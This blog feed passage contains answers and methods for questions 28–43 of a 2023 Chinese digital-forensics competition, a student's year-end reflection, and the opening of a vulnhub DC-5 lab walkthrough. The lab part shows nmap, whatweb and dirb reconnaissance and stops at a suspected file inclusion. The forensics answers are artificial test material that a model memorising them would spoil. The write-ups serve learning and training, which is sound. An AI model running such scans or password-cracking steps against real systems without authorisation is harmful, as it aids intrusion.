class="headerlink" title="28、检材四中迅雷下载过的文件名是什么？（1分）"></a>28、检材四中迅雷下载过的文件名是什么？（1分）</h3><pre><code>《向银河靠近》.txt</code></pre><p>找到迅雷下载过的文件名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141815830.png" alt="image-20240114181550701"></p><h3 id="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"><a href="#29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）" class="headerlink" title="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"></a>29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）</h3><pre><code>Clash</code></pre><p>分析出来的应用中只有Clash一款vpn应用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141817044.png" alt="image-20240114181721956"></p><h3 id="30、检材四备份的设备系统版本是多少？（1分）"><a href="#30、检材四备份的设备系统版本是多少？（1分）" class="headerlink" title="30、检材四备份的设备系统版本是多少？（1分）"></a>30、检材四备份的设备系统版本是多少？（1分）</h3><pre><code>V14.0.2.0.TKSCNXM</code></pre><p>在<code>descript.xml</code>文件里面找到设备系统版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141818848.png" alt="image-20240114181856726"></p><h3 id="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"><a href="#31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）" class="headerlink" title="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"></a>31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）</h3><pre><code>1702459232429</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141819699.png" alt="image-20240114181946660"></p><h3 id="32、检材四中FileCompress-app-包名是什么？（1分）"><a href="#32、检材四中FileCompress-app-包名是什么？（1分）" class="headerlink" title="32、检材四中FileCompress app 包名是什么？（1分）"></a>32、检材四中FileCompress app 包名是什么？（1分）</h3><pre><code>com.zs.filecompress</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141820504.png" alt="image-20240114182015472"></p><h3 id="33、检材四中备忘录记录的内容是什么？（1分）"><a href="#33、检材四中备忘录记录的内容是什么？（1分）" class="headerlink" title="33、检材四中备忘录记录的内容是什么？（1分）"></a>33、检材四中备忘录记录的内容是什么？（1分）</h3><pre><code>Vcpswd:edgewallet</code></pre><p>给出的应用中并没有备忘录 是因为小米手机里面的备忘录就是笔记 火眼分析之后给出的名字叫便签 其实都是一个东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141824917.png" alt="image-20240114182451871"></p><h3 id="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"><a href="#34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）" class="headerlink" title="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"></a>34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）</h3><pre><code>de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141827195.png" alt="image-20240114182713135"></p><h3 id="35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）"><a href="#35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）" class="headerlink" title="35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）"></a>35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）</h3><pre><code>bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt</code></pre><p>在<code>Bitcoin Wallet(de.schildbach.wallet)\apps\de.schildbach.wallet\f\log\wallet.log</code>中搜索<code>address</code>找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141841378.png" alt="image-20240114184143339"></p><h3 id="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"><a href="#36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）" class="headerlink" title="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"></a>36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）</h3><pre><code>FileCompress(com.zs.filecompress)/FileCompress/11月.txt</code></pre><p>使用火眼哈希值计算工具批量计算检材四和bak文件解压出来的应用文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142205682.png" alt="image-20240114220539617"></p><p>将计算结果进行导出 搜索目标哈希值 找到对应文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142206759.png" alt="image-20240114220638668"></p><h2 id="综合题目"><a href="#综合题目" class="headerlink" title="综合题目"></a>综合题目</h2><h3 id="37、检材中受害人的微信号是多少？（2分）"><a href="#37、检材中受害人的微信号是多少？（2分）" class="headerlink" title="37、检材中受害人的微信号是多少？（2分）"></a>37、检材中受害人的微信号是多少？（2分）</h3><pre><code>B-I-N-A-R-Y</code></pre><p>在嫌疑人的苹果手机的微信记录中有受害人的微信号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132314793.png" alt="image-20240113231439720"></p><h3 id="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"><a href="#38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）" class="headerlink" title="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"></a>38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）</h3><pre><code>章敏</code></pre><p>在嫌疑人的苹果手机微信聊天记录中显示嫌疑人从枫叶的手上购买过数据库  文件名为<code>database.sqlite </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132316046.png" alt="image-20240113231632972"></p><p>这个名字的数据库在检材二中是找不到的 但是在检材一计算机的微信下载记录中可以找到名为<code>database(1).sqlite</code>的数据库文件 结合检材二微信聊天记录中枫叶前后给嫌疑人发了两次数据库文件 第二次为正确的 因为两次发送的数据库名字都是<code>database.sqlite</code> 因此第二次嫌疑人下载数据库文件的时候 名字自然就是<code>database(1).sqlite</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132323262.png" alt="image-20240113232357169"></p><p>我们导出这个文件 在Navicat中打开 就可以找到手机尾号是8686的用户的姓名是章敏</p><h3 id="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"><a href="#39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）" class="headerlink" title="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"></a>39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）</h3><pre><code>jamvU1@wiwgug$bo</code></pre><p>在检材一 的钥匙串——网站与应用密码里面 找到了小西米语音的包名对应的就是账号密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142354168.png" alt="image-20240114235414125"></p><h3 id="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"><a href="#40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）" class="headerlink" title="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"></a>40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）</h3><pre><code>1717</code></pre><p>使用sql语句在第38题找到的公民信息数据库中查找</p><pre><code class="sql">SELECT COUNT(*) AS user_countFROM usersWHERE     strftime(&#39;%Y&#39;, &#39;2023-12-31&#39;) - SUBSTR(IDCARD, 7, 4) BETWEEN 18 AND 30;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151652323.png" alt="image-20240115165228270"></p><h3 id="41、受害人小浩的手机号码是多少（5分）"><a href="#41、受害人小浩的手机号码是多少（5分）" class="headerlink" title="41、受害人小浩的手机号码是多少（5分）"></a>41、受害人小浩的手机号码是多少（5分）</h3><pre><code>13533333333</code></pre><p>在检材三Filecomprss应用文件夹里面有一个<code>11月.txt</code>的文件 其实是一个被修改后缀名的压缩包 解压需要密码 Filecompress应该是一个压缩加密工具 需要我们对这个apk进行逆向 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142357703.png" alt="image-20240114235746603"></p><p>找到密码<code>1!8Da9Re5it2b3a.</code> 解压后得到小浩的手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142359667.png" alt="image-20240114235901635"></p><h3 id="42、完整的受害人名单是几个人。（6分）"><a href="#42、完整的受害人名单是几个人。（6分）" class="headerlink" title="42、完整的受害人名单是几个人。（6分）"></a>42、完整的受害人名单是几个人。（6分）</h3><pre><code>6</code></pre><p>按照上一题的思路 我们在11月.txt的文件中找到了两个受害人 而在检材一计算机的取证结果中 我们在最近访问的结果中看到了9月.txt和10月.txt 那猜测这两个文件中也有当月受害人的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151218108.png" alt="image-20240115121851995"></p><p>但是我们仿真计算机之后并没有找到这两个文件 反而在最近使用文件中找到了一个大小很可疑的<code>新建文本文档.txt</code> 猜测是VC容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151234092.png" alt="image-20240115123438031"></p><p>在第33题中 我们找到了检材四备忘录的内容是<code>Vcpswd:edgewallet </code> 那看来VC容器的挂载密码应该和edgewallet的密码有关 </p><p>在检材一的edge浏览器保存的密码中可以找到edgewallet的账号密码 <code>tiga.ultraman@outlook.com\pR7)nZ5&amp;yQ2-oR0&lt;</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151237617.png" alt="image-20240115123741561"></p><p>尝试使用这个密码对VC容器进行挂载 挂载成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151238728.png" alt="image-20240115123840686"></p><p>9月.txt和10月.txt 都在里面 其中9月.txt可以直接打开 10月.txt和11月.txt一样是一个修改了后缀名的压缩包 加密方式和加密密码与11月.txt一样 解压之后就可以得到真正的10月.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151241106.png" alt="image-20240115124149063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151242669.png" alt="image-20240115124200645"></p><p>所以受害人一共有6人</p><h3 id="43、受害人转账的总金额是多少（5分）"><a href="#43、受害人转账的总金额是多少（5分）" class="headerlink" title="43、受害人转账的总金额是多少（5分）"></a>43、受害人转账的总金额是多少（5分）</h3><pre><code>600</code></pre><p>在给出的苹果手机备份和后面找到的加密手机备份中都可以找到嫌疑人向受害人索要钱财的聊天记录 分为3次 每次200 一共600元</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334900.png" alt="image-20240113233409862"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334979.png" alt="image-20240113233422928"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132333685.png" alt="image-20240113233355630"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这次学到了很多新的做题方法</p><p>（1）在bitlocker密钥爆破时间很长时 可以先使用取证大师的内存解析工具从内存中找一找密钥文件</p><p>（2）遇到苹果加密备份 使用passwarekit爆破<code>Manifest.pslist</code>文件 得到密钥 在工具中解密备份在分析</p><p>（3）遇到大的内存镜像 vol2分析不了 vol3在虚拟机中不方便拖动镜像  可以先用取证大师和火眼的内存解析工具分析 两者结合起来看 </p><p>（4）遇到安卓手机bak备份文件 先使用7zip全部解压 再把解压后的文件拖进火眼里面分析即可</p><p>（5）多注意检材间的联系 同时要擅长发现vc tc等加密容器</p><p>（6）一些加密密钥有的时候可以通过逆向分析的方法来获得</p><p>2.大题的做题思路是：</p><p>（1）对检材一到四正常分析</p><p>（2）根据题目提示和内存镜像爆破结果发现嫌疑人曾搜索过“ios备份密码忘了怎么办 五位纯数字”，分析可能还有一个加密ios备份，在检材1嵌套证据文件中找到该加密备份，对该备份进行正常的数据解密、获取和分析。</p><p>（3）在家米备份中找到小西米语音的账号密码 根据题目提示也知道小西米语音的聊天记录中有东西 由此找到嫌疑人约定的电子钱包品牌和比例</p><p>（4）在检材四分析FileCompress时找到一个11月.txt 发现是加密压缩包 通过逆向分析FileCompress软件 找到压缩包密码 由此找到11月的受害人名单</p><p>（5）在检材一的最近访问项目中还存在10月.txt和9月.txt  但是找不到这两个文件 进一步发掘找到新建文本文档.txt 这个VC容器 在检材四的备忘录中提示VC容器密码 得到密码 挂载容器 找到完整的受害人名单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023中科实数杯&quot;&gt;&lt;a href=&quot;#2023中科实数杯&quot; class=&quot;headerlink&quot; title=&quot;2023中科实数杯&quot;&gt;&lt;/a&gt;2023中科实数杯&lt;/h1&gt;&lt;p&gt;当时比赛在学校的训练馆里面 巨冷 直接被造成魔法伤害 还由于笔记本内存太小 火眼取证</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="ios加密备份" scheme="http://w3nx1z1.github.io/tags/ios%E5%8A%A0%E5%AF%86%E5%A4%87%E4%BB%BD/"/>
    
  </entry>
  
  <entry>
    <title>w3nx1z1的年度个人总结</title>
    <link href="http://w3nx1z1.github.io/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
    <id>http://w3nx1z1.github.io/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-31T17:21:44.200Z</published>
    <updated>2023-12-31T17:24:29.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年度个人总结"><a href="#2023年度个人总结" class="headerlink" title="2023年度个人总结"></a>2023年度个人总结</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><pre><code>第一次写年度总结，倒也没有什么别的想法，只是觉得是时候总结给自己接触ctf，接触网络安全这一年一个小总结了。是的，是时候了。</code></pre><h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>本身我在进入大学之前是完全没有计算机基础的。很难想象我在高考报志愿的时候没有报一个计算机方向的专业，而且我本人当时也是非常抵触这个专业，感觉自己的脑子学不来，只是在提前批报了网安，也是单纯因为这个专业是你jd分最高的专业，而我当时是非常想学医的。所以也算是误打误撞走进这扇门的吧。</p><p>其实大一上学期本身是小学期再加上为时不短的军训，在通过纳新赛加入信息安全社团之后没多长时间，由于疫情原因就回家了(现在还是非常怀念因为yq而可以提前回家的日子)，之后就是网课、复习、考试。可以说大一上学期不能称为一个正式对于安全学习的开始。</p><p>我个人感觉真正学习的开始，还是在寒假。当时社团里面也没有像我们现在对于23级的管理一样，规划好假期督促学习的一系列计划，完全就是散养哈哈哈。但说白了学习本身就是自己的事情，倒也无可厚非。虽然当时自己还是处于一个懵懂的状态，对于怎么去学习取证、怎么去学习ctf完全没有一个自己的方法。于是便从基础的python语言学起，这里真的感谢我尚青哥，不论是在进入社团之前还是进入社团之后前期的学习过程中都给了我很大帮助。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312255741.png" alt="image-20231231225511655"></p><p>之后老师和学长们也给了一些资源，开始看取证和ctf的课程，再结合对比赛的复现和刷题，慢慢的自己也能做出来一些题了。ctf是选择了misc方向，听说misc打得好是可以成为全栈爷的hhh(绝对不是因为别的方向完全找不到入门的思路)</p><p>当时大大小小的比赛也参与了不少，记忆犹新就是西湖和春秋杯，真的只能签个到就润。做的稍微多一点的可能是nepnep战队办的CATCTF了吧，那也是第一次熬夜上分，大年三十上了一道新年题，本来已经要休息了，看到上新题了又爬起来看，没想到睡意全无就又冲了很长时间。</p><p>很快假期就结束了，又开始了高难度生活模式</p><h2 id="初具方向"><a href="#初具方向" class="headerlink" title="初具方向"></a>初具方向</h2><p>新学期开始之后，每天的生活也很简单，四点一线：食堂、宿舍、教学楼、实验室。基本上每天有空就去实验室，还是延续高中带来的那一套，学知识点、刷题、写wp，慢慢积累了很多misc的解题姿势也扩大了自己的脑洞。</p><p>带给我信心的一次比赛是山警举办的黄河流域网络空间安全技能挑战赛(后文简称”黄河流域“)。当时misc里面有一道是日卫星的题，做出来的人很少。我简单的搜了搜，发现有一道题和这道差不多，基本的原理和脚本都是大差不差的，于是下定决心要搞出来。可能放在现在看，当时那道题也没什么难的，但确实让我研究了一上午才搞出来。看着题目从灰色变为绿色，一种说不出来的成就感油然而生。虽然到最后也就出了一个web一个misc，同时也是感谢主办方给了大比例的获奖机会，拿到了人生中第一个ctf的奖。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312330175.png" alt="image-20231231233001115"></p><p>也是从这一刻开始，下定决心要坚持把这条道阻且长的安全之路走下去。</p><h2 id="确定方向"><a href="#确定方向" class="headerlink" title="确定方向"></a>确定方向</h2><p>之后就是按部就班的学习，也慢慢开始混迹于各个ctf群，虽然到后来发现基本上每个群都是换群不换人hhh，进了一个新群好多都是眼熟的师傅。直到有一天，在一个群里看到了星盟安全团队在招人，当时抱着试试的想法，简单写了一份粗糙的简历便投上去了。</p><p>因为是misc方向，所以是Ba1_Ma0师傅来带的面试，虽然给我的两道题都只是有思路但没有解出来，但还是成功进入了主队，现在想想还是非常开心的。开始以为猫爷也是做misc的，但当看到猫爷的博客之后才发现这才是真正的全栈爷啊呜呜呜。</p><p>接到通过结果的那个中午，我整个人都高兴的要飞起。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312340297.png" alt="image-20231231234026256"></p><p>但是很遗憾的是上半年国赛的成绩不是很理想，当时看了华北地区晋级榜单，好像就差50分一道题就可以进半决赛了，虽然前面有两只学长的队伍，就算我们勉强够上分数线也无法晋级线下就是了QAQ。</p><p>因此也意识到了只学misc还是有局限性的，于是开始了misc和web双修的过程，算是确定了方向。</p><h2 id="大一暑假"><a href="#大一暑假" class="headerlink" title="大一暑假"></a>大一暑假</h2><p>紧接着大一暑假学校安排了认知实习，非常幸运分到了网安大队，队里的大哥们人都很好，平时工作也不是很忙，还有专门的实验室，真的给我提供了一个非常优渥的学习环境。(队里的实验室真的是帅炸了)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312343237.png" alt="image-20231231234341018"></p><p>在战队里面进步的速度还是很快的，认识了很多超强的师傅，战队里一些制度也让我更加勤奋的去学习，这段时间也是快速积累实力的时期。</p><h2 id="步入正轨"><a href="#步入正轨" class="headerlink" title="步入正轨"></a>步入正轨</h2><p>进入大二，因为某些不可抗因素吧，我担任了军训班长，在那一个月的时间里，基本上学习处于一个停摆的状态。每晚带完新生要到10点钟左右，我在回到宿舍抓紧学一会儿，那时候真的身心俱疲，在这种情况下，去参加了蓝帽杯半决赛，也是很遗憾，差5名没能进决赛，感觉非常对不住老师和我的两位队友。</p><p>带训过程也让我认识了很多对网安感兴趣的新生，我也不遗余力的宣传社团的事情，后面社团招新过程也是全程有参与，看到很多优秀的学弟学妹加入社团，我打心底的高兴。</p><p>下半年连续参加了三场线下赛(真不想算上中科实数)，蓝帽、美亚、冀信，哈尔滨、厦门、石家庄，打比赛的过程中也学到了很多东西，尤其是冀信，比赛前两天的渗透+应急响应培训扫盲效果还是很好的。本来说是要参加攻防演练，于是在当时就开始学习接触渗透的知识，跟着wp打了四五个靶场，收集了一些基本的渗透工具和做题思路。作为打得第一场渗透和应急响应比赛，在冀信杯的时候还算正常发挥。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010038523.png" alt="image-20240101003816330"></p><p>打完冀信杯回学校后，就差不多该准备期末考试了，之后的一些ctf比赛也没怎么参加。这学期高强度的文化课让我实在是压力大，一学期的课都要在剩余的几天里突击完，属实是非常狼狈hhh</p><h2 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h2><p>回顾这一年的学习经历，其实不满意和意难平的地方还有很多。体制内学校繁杂的事务，往往让本就不多的学习时间更加碎片化。我自身的学习效率也是一个很大的问题，学到的东西还是太少了。在取证方面，还是太依赖自动化工具，参加过今年龙信杯、盘古石杯、美亚杯、中科实数杯等一系列取证比赛之后，不难看出日后取证比赛的出题趋势是向手工取证倾斜，常规的取证工具只能做出基础题甚至只能作为你取证的一个小依据。在取证这块还是应该深挖，否则难以跟上日渐增加的取证比赛难度，也难以增长自身实力。</p><p>不过学习就是这样子，和师傅们，和知识点们，和赛题们，你追我赶，只有存在挑战，才存在无限进步提升的可能。告别2023，拥抱2024，在新的一年里，无论是取证，还是ctf抑或是渗透，相信自己都能拿出全部的状态去学习，踏踏实实的掌握更多的技术，期待更精彩的未来！</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>其实在学校里面的生活，大家应该懂的都懂，警务化管理下，活着已经是很棒了(bushi)日复一日的各种制度约束之下，或许只有在安全之路上的些许进步才能为我的生活激起一点涟漪。</p><p>精彩的部分还是在去线下比赛的日子里，比赛成绩先放一边，虽然每次可以出去的时间有限可以在大部分同学都只能待在学校的情况下，可以经由比赛和许多城市结缘，便足以让人羡慕。</p><ul><li><p>在哈尔滨逛中央大街</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010105768.png" alt="image-20240101010558526"></p></li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010106205.png" alt="image-20240101010609839"></p><ul><li>在厦门逛曾厝垵、坐船出海</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107291.png" alt="image-20240101010710896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107995.png" alt="image-20240101010720755"></p><ul><li>在石家庄(虽然没啥好玩的，但是每天吃的都很好)</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108442.png" alt="image-20240101010818692"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108952.png" alt="image-20240101010835234"></p><p>希望新的一年中，自己可以除了学习之外，可以拿出一部分时间去多做运动，毕竟身体素质到最后联考的时候还是要达标的。也能将半年不玩的羽毛球重新拾起来，有时候真的希望时间可以拆成两半花啊</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到这里，平平无奇的2023年度总结就要结束了，感谢自己能在2024年1月1号趁着还不算太晚将这篇年度总结写出来，也很感谢看到这里的大家。</p><p>感谢老师、学长学姐们的引导，让我打开安全这扇门，得以在大学生活中实现自己的价值，而不是随波逐流，虚度光阴。</p><p>也祝愿所有师傅们，在新的一年里，做自己想做的事，爱自己想爱的人，技术进步，生活顺利，一血拿到手软，挖洞随心所欲！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年度个人总结&quot;&gt;&lt;a href=&quot;#2023年度个人总结&quot; class=&quot;headerlink&quot; title=&quot;2023年度个人总结&quot;&gt;&lt;/a&gt;2023年度个人总结&lt;/h1&gt;&lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;head</summary>
      
    
    
    
    <category term="随笔" scheme="http://w3nx1z1.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-5</title>
    <link href="http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</id>
    <published>2023-12-05T12:41:12.972Z</published>
    <updated>2024-01-15T09:34:42.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-5通关记录"><a href="#vulnhub靶场DC-5通关记录" class="headerlink" title="vulnhub靶场DC-5通关记录"></a>vulnhub靶场DC-5通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.And just for the record, there is no phpmailer exploit involved. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.But if you&#39;re really, really stuck, you can watch this video which shows the first step.</code></pre><p>提到本次靶场中 不存在ssh服务</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先 给靶机开启NAT模式 使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121443158.png" alt="image-20231212144354908"></p><p>扫出来是<code>192.168.160.156</code></p><p>在扫描详细的端口信息</p><pre><code>nmap -A -p- -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121447097.png" alt="image-20231212144708011"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本是1.6.2开放了111端口 存在rpcbind服务 版本是2.4</code></pre><h4 id="了解一下rpcbind服务"><a href="#了解一下rpcbind服务" class="headerlink" title="了解一下rpcbind服务"></a>了解一下rpcbind服务</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121514830.png" alt="image-20231212151438774"></p><p>这里要先说一下NFS文件系统 </p><pre><code>NFS(network file system)：网络文件系统。Linux下三大文件系统之一，采用C/S架构。允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS应用中，本地NFS客户端可以透明的读写位于远端NFS服务器上的文件。NFS服务器主要进程1 rpc.nfsd 进程NFS 服务的主进程，主要管理客户端是否能够接入 NFS 服务器以及数据的传输。该进程固定监听 TCP/UDP 2049 端口。2 rpc.mountd 进程管理和维护 NFS 文件系统，根据所设定的权限决定是否允许客户端挂载指定的共享目录。该进程监听的端口默认是不固定的。3 rpc.lockd 进程提供文件锁功能，防止多个客户端同时写入一个文件。该进程监听的端口默认是不固定的。4 rpc.statd 进程负责检查数据的状态及一致性，需要与 rpc.lockd 配合使用。该进程监听的端口默认是不固定的。5 rpcbind 进程RPC 的端口映射器进程，监听 UDP 111 端口。NFS服务端机器：通过NFS协议将文件共享到网络上NFS客户端机器：通过网络挂载NFS共享目录到本地</code></pre><pre><code>RPC(Remote Procedure Call):远程过程调用协议NFS 只提供了基本的文件处理功能，而不提供任何 TCP/IP 数据传输功能。它需要借助 RPC 协议才能实现 TCP/IP 数据传输功能。RPC 最主要的功能就是在指定每个 NFS 功能所对应的端口序号（port number ），并且回报给客户端，让客户端可以连结到正确的物理端口（port）上去。</code></pre><p>一般情况下 rpcbind服务运行在111、31端口  本次靶机的rpcbind服务就开在111端口上</p><p>在使用whatweb进行站点CMS识别</p><pre><code>whatweb -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121537393.png" alt="image-20231212153754332"></p><p>使用dirb 扫一下目录</p><pre><code>dirb http://192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121540460.png" alt="image-20231212154018411"></p><p>没扫出来啥东西 </p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121541907.png" alt="image-20231212154101840"></p><p>在contact页面 看到可以提交东西 尝试随便写点内容提交</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121552060.png" alt="image-20231212155206018"></p><p>发现跳转到thankyou.php 对于提交的内容 使用GET方式进行上传 </p><p>但是注意到 在提交之后下面的年份发生了变化 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121558821.png" alt="image-20231212155846787"></p><p>从2019年变为了2018年 </p><p>尝试刷新发现 即使不传入参数 只刷新页面 这个年份也会改变 怀疑存在文件包含 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121607142.png" alt="image-20231212160757111"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121608184.png" alt="image-20231212160809141"></p><h4 id="确认文件包含"><a href="#确认文件包含" class="headerlink" 